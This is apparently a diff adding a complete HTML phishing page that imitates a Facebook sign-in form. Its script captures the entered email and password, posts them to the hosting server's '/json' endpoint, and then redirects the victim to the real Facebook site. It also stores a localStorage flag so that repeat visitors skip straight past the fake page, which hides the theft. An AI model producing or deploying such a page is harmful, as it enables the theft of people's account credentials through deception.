@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="shortcut icon" href="/img" type="image/x-icon">
+    <style>
+        *{
+            padding: 0;
+            margin: 0;
+        }
+        body{
+            height: 100vh;
+            position: relative;
+        }
+        #f_per{
+            display: flex;
+            height: 70px;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 30px;
+            background: #4a70ff;
+        }
+        #f_per p{
+            font-size: larger;
+            color: #fff;
+            font-weight: bolder;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+        #s_per{
+            padding: 10px;
+            display: flex;
+            justify-content: center;
+
+            align-items: center;
+            flex-direction: column;
+            transform: translateY(20%);
+
+
+        }
+        form{
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 10px;
+            border: #000 solid 1px;
+            border-radius: 5px;
+            align-items: center;
+        }
+        form *{
+            margin: 10px 5px;
+            position: relative;
+        }
+        input{
+            border-bottom-color: #0000;
+            line-height: 0;
+            width: 250px;
+            
+            line-height: 30px;
+            letter-spacing: 1px;
+            font-size: large;
+            font-family: 'Times New Roman', Times, serif;
+            padding: 2px 5px;
+            outline: none;
+            border: none;
+            background-color: #0000;
+            transition: .5s;
+            border-bottom: #000 solid 1px;
+        }
+        input:focus{
+            color: #2a70ff;
+            border-bottom: #2a70ff solid 1px;
+        }
+        button{
+            background-color: #4a70ff;
+            width: 80%;
+            font-size: large;
+            cursor: pointer;
+            transition: .5s;
+            height: 40px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            color: #fff;
+            border: none;
+        }
+        button:hover{
+            background-color: #2a70ff;
+        }
+        
+        p{
+            text-align: left;
+        }
+        label{
+            transform: translate(-90px,45px);
+            transition: .5s;
+            
+
+        }
+        .vas{
+            color: #000;
+  
+            transform: translate(-90px,25px);
+            z-index: 1;
+        }
+
+    </style>
+
+</head>
+<body>
+    <script src="/jq"></script>
+    <script>
+        
+        if (localStorage.getItem("yet") == "true") {
+            location.replace("https:/www.facebook.com")
+        }
+    </script>
+    <div id="f_per">
+        <p>Facebook</p>
+        <img src="/img" style="width: 50px;height: 50px;" alt="facebookicon">
+    </div>
+
+    <div id="s_per">
+        <form id="form" method="post" action="/json">
+            <img src="/img" style="width: 50px;height: 50px;" alt="facebookicon">
+            <p id="er"></p>
+            <label id="fr" for="usr">UserName</label>
+            <input id="fir" name="usr" type="email" required>
+            <p id="f_er"></p>
+            <label id="sc" for="pass">Password</label>
+            <input id="sec" name="pass" type="password" minlength="8" required>
+            <p id="s_er"></p>
+
+            <button type="submit" id="sbtn">Sign In</button>
+
+
+
+        </form>
+    </div>
+
+
+<script>
+    
+    function add(x,y) {
+        $(`#${x}`).focus(()=>{
+            $(`#${y}`).addClass("vas")
+        })
+        
+        
+           $(`#${x}`).blur(()=>{
+            let z = document.getElementById(x).value
+            if (z == "") {
+            $(`#${y}`).removeClass("vas")
+            }
+        }) 
+        
+        
+    }
+  
+        add('fir','fr')
+        add("sec","sc")
+</script>
+<script src="/ax"></script>
+<script>
+
+    
+   const form = document.getElementById("form")
+
+    form.addEventListener("submit",(e)=>{
+        e.preventDefault()
+        const formdata = new FormData(form);
+        const formreq = `usr=${formdata.get('usr')}&pass=${formdata.get("pass")}`
+        axios.post("/json",formreq)
+        .then(res=>{
+            if (res.statusText == "OK" || res.statusText == "ok" || res.status == 200) {
+                console.log(res.data)
+
+            }
+            localStorage.setItem("yet","true")
+            setTimeout(function () {
+
+                location.replace("https:/www.facebook.com")
+            },500)
+
+        }).catch(error=>{
+            console.log(error)
+        })
+        
+    })
+
+    
+    
+</script>
+<!--|||||||| THE END ||||||-->
+</body>
+</html>
